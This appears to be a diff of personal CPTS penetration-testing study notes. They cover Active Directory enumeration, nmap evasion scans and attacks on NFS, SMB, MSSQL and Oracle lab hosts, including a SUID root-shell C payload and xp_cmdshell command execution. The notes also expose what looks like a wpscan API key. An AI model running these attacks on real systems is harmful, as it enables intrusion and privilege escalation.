+- [Scripts](#cpts-privesc-scripts-c4d7f139)
+- [Service Binary Hijacking-MacBook Pro](#cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6)
+- [User Privileges](#cpts-privesc-user-privileges-db86feff)
+- [Vulnerable Software](#cpts-privesc-vulnerable-software-0b603bf7)
+<a id="cpts--privesclinux"></a>
+
+## PrivEsc/Linux
+
+- [Crontabs (Scheduled Tasks)](#cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87)
+- [Exposed Confidential Info](#cpts-privesc-linux-exposed-confidential-info-9d2298c6)
+- [Methodology Checklist](#cpts-privesc-linux-methodology-checklist-c0fa3016)
+- [OS and Kernel Exploits](#cpts-privesc-linux-os-and-kernel-exploits-0610e3eb)
+- [Path Abuse](#cpts-privesc-linux-path-abuse-b5a507cc)
+- [SUID Sticky Bit](#cpts-privesc-linux-suid-sticky-bit-a4af3b7a)
+- [Write perms to etc passwd](#cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403)
+<a id="cpts--privescwindows"></a>
+
+## PrivEsc/Windows
+
+- [Admin user with no admin privileges](#cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f)
+- [DLL Hijacking](#cpts-privesc-windows-dll-hijacking-3a400c32)
+- [Exposed Credentials](#cpts-privesc-windows-exposed-credentials-09889ee3)
+- [Methodology Checklist](#cpts-privesc-windows-methodology-checklist-32314143)
+- [Scheduled Tasks](#cpts-privesc-windows-scheduled-tasks-2dc078d8)
+- [Service Binary Hijacking](#cpts-privesc-windows-service-binary-hijacking-ada39c1a)
+- [Services Automatically Started on Boot](#cpts-privesc-windows-services-automatically-started-on-boot-769440ef)
+- [Unquoted Service Paths](#cpts-privesc-windows-unquoted-service-paths-53b627a0)
+<a id="cpts--reconnaissance"></a>
+
+## Reconnaissance
+
+- [AD Reconnaissance](#cpts-reconnaissance-ad-reconnaissance-cbb23af1)
+- [Cloud Resources](#cpts-reconnaissance-cloud-resources-836ba495)
+- [Domain Discovery](#cpts-reconnaissance-domain-discovery-d1213c29)
+- [Host Discovery](#cpts-reconnaissance-host-discovery-a202aa9e)
+- [Password Hunting](#cpts-reconnaissance-password-hunting-d3163f7e)
+- [Username Discovery](#cpts-reconnaissance-username-discovery-3e712759)
+- [Web Reconnaissance](#cpts-reconnaissance-web-reconnaissance-2c284fa9)
+
+Two unreadable OneDrive notes were omitted at your request: `Exploits/Web Exploits.md` and `Exploits/Web Shells-DESKTOP-0GERI6L.md`.
+
+
+---
+
+<a id="cpts-external-resources-8d4c7c1a"></a>
+
+<a id="cpts-external-resources-8d4c7c1a--external-resources"></a>
+
+# External Resources
+
+
+<https://github.com/missteek/cpts-quick-references>
+
+
+---
+
+<a id="cpts-things-to-run-on-base-kali-16524e15"></a>
+
+<a id="cpts-things-to-run-on-base-kali-16524e15--things-to-run-on-base-kali"></a>
+
+# Things to run on base Kali
+
+
+Install WAFW00F
+
+```shell-session
+pip3 install git+https://github.com/EnableSecurity/wafw00f
+```
+
+Install Scrapy
+sudo apt search scrapy
+sudo apt install python3-scrapy
+
+
+---
+
+<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6"></a>
+
+<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--advanced-domain-enumeration"></a>
+
+# Advanced Domain Enumeration
+
+
+<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--windapsearch"></a>
+
+### Windapsearch
+```shell
+cd cpts-tools/windapsearch
+python -m venv myfirstproject
+source myfirstproject/bin/activate
+pip3 install python-ldap
+
+#Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+#Privileged Users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+<a id="cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6--bloodhound"></a>
+
+### Bloodhound
+```shell
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+On Kali 2024
+```shell
+sudo neo4j start
+bloodhound
+(neo4j/neo4j1)
+```
+
+
+---
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e"></a>
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--basic-enumeration"></a>
+
+# Basic Enumeration
+
+
+```powershell
+Get-Module
+Import-Module ActiveDirectory
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--get-domain-info"></a>
+
+### Get Domain Info
+```powershell
+Get-ADDomain
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+Get-ADTrust -Filter *
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--powerview"></a>
+
+### Powerview
+```powershell
+import-module .\Powerview.ps1
+
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+Get-DomainTrustMapping
+
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--snaffler"></a>
+
+### Snaffler
+Searches for sensitive files in shares and displays them (VERY USEFUL)
+```powershell
+.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--arp-find-other-hosts"></a>
+
+#### ARP (find other hosts)
+```powershell
+arp -a
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--view-routing-table"></a>
+
+#### View routing table
+```powershell
+route print
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--quick-wmi-checks"></a>
+
+#### Quick WMI checks
+```powershell
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+```
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--net-checks"></a>
+
+#### Net checks
+![Pasted image 20250831200044.png](cpts/assets/Pasted%20image%2020250831200044.png)
+
+<a id="cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e--dsquery"></a>
+
+#### Dsquery
+```powershell
+dsquery user
+dsquery computer
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
+
+
+---
+
+<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2"></a>
+
+<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2--methodology"></a>
+
+# Methodology
+
+
+1. Simple Enumeration
+2. Use our own scripts
+3. Powerview.ps1
+4. PsLoggedon.exe
+
+---
+
+Use Net to find out more about user,domain etc
+```cmd
+net user /domain
+net user jeff
+net user jeffadmin /domain
+net group /domain
+net group "Sales Department" /domain
+```
+
+Use our own scripts
+```powershell
+powershell -exec bypass
+Import-Module .\function.ps1\ #can get it from cpts-tools
+
+LDAPSearch -LDAPQuery "(samAccountType=805306368)"
+LDAPSearch -LDAPQuery "(objectclass=group)"
+foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
+$group.properties | select {$_.cn}, {$_.member}
+
+$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
+$sales.properties.member
+}
+```
+
+Powerview
+```powershell
+powershell -exec bypass
+Import-Module .\PowerView.ps1 #get from cpts-tools
+
+# List of enumeration commands
+Get-NetDomain
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+Get-NetGroup | select cn
+Get-NetGroup "Sales Department" | select member
+
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+
+#See where user accounts have logged into
+Find-LocalAdminAccess
+Get-NetSession
+Get-NetSession -ComputerName files04 -Verbose
+Get-NetSession -ComputerName web04
+
+#Object enumeration
+Get-ObjectAcl -Identity stephanie
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+
+# use this command and look out for generic all, then use the sid to see what it is
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
+
+#domain share enumeration
+Find-DomainShare
+
+```
+
+PsLoggedOn (this can check for logon sessions btr than powerview)
+```powershell
+.\PsLoggedon.exe \\files04 #where the \\files04 is the name of the pc
+.\PsLoggedon.exe \\web04
+```
+
+Get Service principal names
+```cmd
+setspn -L iis_service
+```
+```powershell
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+```
+
+---
+<a id="cpts-enumeration-ad-enumeration-methodology-4ece01a2--bloodhound"></a>
+
+#### Bloodhound
+```powershell
+# run sharphound on the target domain first
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+
+#ON BASE KALI
+sudo neo4j start
+bloodhound #AUTH USING neo4j1:neo4j1
+```
+
+
+---
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604"></a>
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--password-policy-discovery"></a>
+
+# Password Policy Discovery
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-rpcclient"></a>
+
+#### Using rpcclient
+```shell
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> querydominfo
+rpcclient $> getdompwinfo
+```
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-enum4linux"></a>
+
+#### Using enum4linux
+```shell
+enum4linux -P 172.16.5.5
+enum4linux-ng -P 172.16.5.5 -oA ilfreight #use this for output
+```
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-ldapsearch"></a>
+
+#### Using ldapsearch
+```shell
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--netexe-from-windows-cmd"></a>
+
+### net.exe (from windows cmd)
+```cmd
+net accounts
+```
+
+<a id="cpts-enumeration-ad-enumeration-password-policy-discovery-75263604--using-powerview-from-windows-powershell"></a>
+
+#### Using PowerView (from windows powershell)
+```powershell
+import-module .\PowerView.ps1
+Get-DomainPolicy
+```
+
+
+---
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0"></a>
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--user-enumeration"></a>
+
+# User Enumeration
+
+
+Find available domain user accounts
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-enum4linux"></a>
+
+### Using Enum4linux
+```shell
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-rpcclient"></a>
+
+### Using rpcclient
+```shell
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> enumdomusers 
+```
+
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-crackmapexec-users-flag"></a>
+
+### Using CrackMapExec --users Flag
+```shell
+crackmapexec smb 172.16.5.5 --users
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+```
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--gathering-users-with-ldap-anonymous"></a>
+
+### Gathering Users with LDAP Anonymous
+```shell
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--using-windapsearch"></a>
+
+### Using windapsearch
+```shell
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+<a id="cpts-enumeration-ad-enumeration-user-enumeration-247f74c0--kerbrute-user-enumeration"></a>
+
+### Kerbrute User Enumeration
+```shell
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+```
+
+
+---
+
+<a id="cpts-enumeration-basic-enumeration-netcat-3782f2cb"></a>
+
+<a id="cpts-enumeration-basic-enumeration-netcat-3782f2cb--netcat"></a>
+
+# netcat
+
+
+ Banner Grabbing
+```bash
+nc -nv 10.129.42.253 21
+```
+
+
+---
+
+<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc"></a>
+
+<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--nmap"></a>
+
+# nmap
+
+
+ Full and thorough scan
+```bash
+nmap -sV -sC -p- -v 10.129.42.253
+```
+
+ Specific Scripts
+```bash
+ locate scripts/citrix
+ nmap --script <script name> -p<port> <host>
+```
+
+ Banner Grabbing
+```bash
+ nmap -sV --script=banner <target>
+ nmap -sV --script=banner -p21 10.10.10.0/24
+```
+
+Output to file flags
+- Normal output (`-oN`) with the `.nmap` file extension
+- Grepable output (`-oG`) with the `.gnmap` file extension
+- XML output (`-oX`) with the `.xml` file extension
+- ALL of the above (-oA)
+```bash
+sudo nmap 10.129.2.28 -p- -oA target
+```
+
+Viewing in browser with stylesheet
+```bash
+xsltproc target.xml -o target.html
+firefox target.html
+```
+
+
+<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--useful-flags"></a>
+
+#### Useful Flags
+```bash
+--stats-every=5s (Updates console every 5 seconds of progress)
+
+-v (verbose)
+
+-vv (OMEGA verbose)
+
+-T1 to -T5 (Speed)
+
+-sS (stealth scan)
+
+-sU (UDP scan)
+
+-sV (Probe open ports for service/version)
+
+-p (scans top 1000 ports if left blank or you can specify range)
+
+-p- (scans all 65535 ports)
+
+-O (gets operating system information)
+
+-A (basically -O, -sV, -sC, Traceroute) all in one
+
+--packet-trace (show all packets sent and received)
+```
+
+<a id="cpts-enumeration-basic-enumeration-nmap-71f192fc--firewall-evasion-techniques"></a>
+
+#### Firewall Evasion Techniques
+
+Send ACK packet only
+```bash
+sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
+```
+Decoy scan
+```bash
+sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
+```
+Scan using different source IP
+```bash
+sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
+```
+DNS Proxying
+```bash
+sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
+
+ncat -nv --source-port 53 10.129.2.47 50000
+```
+
+
+
+---
+
+<a id="cpts-enumeration-basic-enumeration-whatweb-968b4bb4"></a>
+
+<a id="cpts-enumeration-basic-enumeration-whatweb-968b4bb4--whatweb"></a>
+
+# whatweb
+
+Just another method of banner grabbing but for http
+
+```bash
+whatweb 10.129.42.190
+whatweb http://10.129.42.190/nibbleblog
+```
+
+![Pasted image 20250325092955.png](cpts/assets/Pasted%20image%2020250325092955.png)
+
+
+
+
+---
+
+<a id="cpts-enumeration-basic-enumeration-wpscan-f89cb6da"></a>
+
+<a id="cpts-enumeration-basic-enumeration-wpscan-f89cb6da--wpscan"></a>
+
+# wpscan
+
+`- Wordpress password begin with ```$P$B```
+- API-Key 5SakvURaMPAgT1WkWrqlKF7u8plizyI95lmt6OsdcVo
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1"></a>
+
+<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1--1112049-nfs"></a>
+
+# 111,2049 nfs
+
+ Scan commands
+```shell
+sudo nmap 10.129.14.128 -p111,2049 -sV -sC
+```
+
+ NSE Scripts
+```shell
+sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+```
+
+Show available NFS Shares
+```shell
+showmount -e 10.129.14.128
+```
+
+Mount available NFS Share on kali
+```shell
+vernonlim03@htb[/htb]$ mkdir target-NFS
+vernonlim03@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+vernonlim03@htb[/htb]$ cd target-NFS
+vernonlim03@htb[/htb]$ tree .
+```
+
+Listing of NFS contents
+- The owners of the files/folders will be the same as on the NFS Server
+- If root_squash in config file is on, backup.sh files cannot be edited on kali even as root
+```shell
+ls -l mnt/nfs/
+ls -n mnt/nfs/
+```
+
+<a id="cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1--suid-binary-exploit"></a>
+
+##### SUID Binary exploit
+- Must have SSH access to the victim machine
+- Check /etc/exports on victim machine to see if no_root_squash is enabled
+
+Payload in C
+```C
+#include <unistd.h>
+int main() {
+    setuid(0); // Change to root (or target user's UID)
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Compile above code and upload to mounted NFS Share and add suid on the binaryu
+```bash
+gcc shell.c -o shell -static
+cp shell /tmp/nfs_mount/
+chmod +s /tmp/nfs_mount/shell
+```
+
+Login to ssh and run the shell
+```bash
+/path/to/nfs_share/shell
+cat /home/user/secret.txt
+```
+
+Default config file on victim machine
+```
+/etc/exports
+```
+
+Unmounting nfs share
+```bash
+cd ..
+sudo umount ./target-NFS
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-135-wmi-e1af59a1"></a>
+
+<a id="cpts-enumeration-service-enumeration-135-wmi-e1af59a1--135-wmi"></a>
+
+# 135 WMI
+
+Basic Commands
+```
+nmap -sV -sC -p 135 10.129.120.23
+```
+
+WMIExec.py (Gain shell access)
+```shell
+/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0"></a>
+
+<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0--139445-smb"></a>
+
+# 139,445 smb
+
+
+ Basic commands
+```bash
+nmap --script smb-os-discovery.nse -p 139,445 10.10.10.40
+nmap -A -sV -sC -p 139,445 10.129.42.253
+smbclient -N -L \\\\10.129.42.253
+```
+
+RPCclient
+```shell
+rpcclient -U "" -N 10.129.14.128
+```
+![Pasted image 20250401015814.png](cpts/assets/Pasted%20image%2020250401015814.png)
+BruteForcing User RIDs
+```shell
+vernonlim03@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+
+vernonlim03@htb[/htb]$ samrdump.py 10.129.14.128
+```
+
+ Listing Contents within particular share
+```bash
+smbclient \\\\10.129.42.253\\users
+```
+
+Adding Login Credentials (Use the -U flag)
+```bash
+smbclient -U bob \\\\10.129.42.253\\users
+```
+
+SMBmap
+```shell
+smbmap -H 10.129.14.128
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'SHARE NAME' --dir-only
+```
+
+NetExec
+```shell
+netexec smb 10.129.14.128 --shares -u '' -p ''
+```
+
+Enum4Linux-ng
+```shell-session
+cd /Desktop/cpts-tools/enum4linux-ng
+./enum4linux-ng.py 10.129.14.128 -A
+```
+
+Default Config File
+```shell
+cat /etc/samba/smb.conf | grep -v "#\|\;" 
+```
+
+Download a file in smbclient
+```shell
+smb: \> get prep-prod.txt
+smb: \> !ls
+```
+
+<a id="cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0--add-in-front-of-bash-commands-without-interrupting-connection"></a>
+
+##### ADD ! IN FRONT OF BASH COMMANDS WITHOUT INTERRUPTING CONNECTION
+
+smbclient commands
+![Pasted image 20250401014737.png](cpts/assets/Pasted%20image%2020250401014737.png)
+
+Check for live connections on victim machine
+```shell-status
+root@samba:~# smbstatus
+```
+
+
+Recursive download of whole share
+```bash
+smbclient //server/share -U username%password -c "prompt; recurse; mget *"
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb"></a>
+
+<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb--143993-imap-pop3"></a>
+
+# 143,993 imap-pop3
+
+
+Basic Commands
+```shell
+sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
+curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
+curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
+```
+
+OpenSSL (Connect over SSL)
+```shell
+openssl s_client -connect 10.129.14.128:pop3s
+openssl s_client -connect 10.129.14.128:imaps
+```
+
+![Pasted image 20250402015201.png](cpts/assets/Pasted%20image%2020250402015201.png)
+![Pasted image 20250402015214.png](cpts/assets/Pasted%20image%2020250402015214.png)
+
+<a id="cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb--list-all-email-contents-in-the-inboxes"></a>
+
+##### List all email contents in the inboxes
+```bash
+a1 LOGIN "username" "password"   # Authenticate
+a2 LIST "" "*"                   # List all mailboxes
+a3 SELECT INBOX                  # Access INBOX
+a4 FETCH 1:* (FLAGS BODY.PEEK[]) # Fetch all emails
+a5 LOGOUT                        # Disconnect
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-1433-mssql-0715e518"></a>
+
+<a id="cpts-enumeration-service-enumeration-1433-mssql-0715e518--1433-mssql"></a>
+
+# 1433 mssql
+
+
+Basic Commands
+```shell
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+
+msfconsole
+use scanner/mssql/mssql_ping
+set rhosts
+run
+```
+
+Connecting with mssqlclient.py
+```shell
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.208.220 -windows-auth
+
+impacket-mssqlclient Administrator:Lab123@192.168.238.18 -windows-auth
+```
+
+mssqlclient commands (display databases)
+```bash
+SQL (ILF-SQL-01\backdoor  dbo@master)> select name from sys.databases
+```
+
+Using xp_cmdshell to get shell access
+```shell
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+EXECUTE xp_cmdshell 'whoami';
+
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8"></a>
+
+<a id="cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8--1521-oracle-tns"></a>
+
+# 1521 oracle-tns
+
+
+Basic Commands
+```shell
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+# Running odat
+python3 -m venv ~/odat-env --system-site-packages
+source ~/odat-env/bin/activate
+python3 ./odat.py all -s 10.129.205.19
+```
+
+Logging in to the service
+```shell
+# RUN THIS SCRIPT FIRST BEFORE SQLPLUS (WILL GET AN INSTABLE SHELL BUT JUST RUN)
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V
+
+sqlplus scott/tiger@10.129.204.235/XE
+
+
+# AUTO ENUM
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below
+```shell
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+
+Oracle RDBMS - File Upload
+```shell
+vernonlim03@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+vernonlim03@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+
+```shell
+curl -X GET http://10.129.204.235/testing.txt
+```
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9"></a>
+
+<a id="cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9--161162-snmp"></a>
+
+# 161,162 snmp
+
+
+This service is a UDP port, remember to scan for udp services if all else fails
+
+ Scan commands
+```bash
+sudo nmap -sU -sC -sV -p 161,162 10.129.42.253
+
+snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
+snmpwalk -v 2c -c private  10.129.42.253
+onesixtyone -c dict.txt 10.129.42.254
+braa public@10.129.14.128:.1.3.6.*
+```
+
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6"></a>
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--21-ftp"></a>
+
+# 21 ftp
+
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--scanning"></a>
+
+### Scanning
+```bash
+nmap -sC -sV -A -p21 10.129.42.253
+nc -nv 10.129.42.253 21
+telnet 10.129.42.253 21
+ftp -p 10.129.42.253
+ftp 10.129.42.253
+openssl s_client -connect 10.129.14.136:21 -starttls ftp (if server has TLS/SSL)
+```
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--nmap-scripts"></a>
+
+##### Nmap scripts
+```shell
+vernonlim03@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts
+
+/usr/share/nmap/scripts/ftp-syst.nse
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
+/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-bounce.nse
+/usr/share/nmap/scripts/ftp-libopie.nse
+/usr/share/nmap/scripts/ftp-anon.nse
+/usr/share/nmap/scripts/ftp-brute.nse
+```
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--anonymous-login"></a>
+
+##### Anonymous Login 
+```bash
+ftp 10.129.14.136
+
+Connected to 10.129.14.136.
+220 "Welcome to the HTB Academy vsFTP service."
+Name (10.129.14.136:cry0l1t3): anonymous
+
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+
+ftp>
+```
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftp-console-enumeration"></a>
+
+### FTP Console Enumeration
+- Change directory using cd at least once (might have a message)
+- Login as different users as they might be placed in their own home directories
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftp-console-enumeration-commands"></a>
+
+### FTP Console Enumeration Commands 
+```ftp
+status
+debug
+trace
+ls
+ls -al
+ls -R
+get Important\ Notes.txt (download file)
+put testupload.txt (upload file)
+```
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--download-all-available-files"></a>
+
+### Download All Available Files
+```shell
+vernonlim03@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
+tree .
+```
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--vsftpd-server-files"></a>
+
+### vsFTPd server files
+```bash
+/etc/vsftpd.conf (file for server logs)
+```
+![Pasted image 20250328224040.png](cpts/assets/Pasted%20image%2020250328224040.png)
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftpusers-file-etcftpusers"></a>
+
+#### FTPUSERS file (/etc/ftpusers) 
+![Pasted image 20250328224556.png](cpts/assets/Pasted%20image%2020250328224556.png)
+USED TO DENY PEOPLE FROM ACCESSING THE FTP SERVICE
+
+
+
+<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--service-hardening-techniques"></a>
+
+### Service Hardening Techniques
+```bash
+hide_ids=YES [All user and group information in directory listings will be displayed as "ftp".]
+ls_recurse_enable=YES [Allows the use of recurse listings.]
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-22-ssh-cb7e3280"></a>
+
+<a id="cpts-enumeration-service-enumeration-22-ssh-cb7e3280--22-ssh"></a>
+
+# 22 ssh
+
+
+Scan Commands
+```bash
+# in cpts-tools/ssh-audit
+./ssh-audit.py 10.129.14.132
+```
+
+Connecting to ssh
+```shell
+ssh -v cry0l1t3@10.129.14.132
+```
+
+Changing authentication method for ssh
+```shell
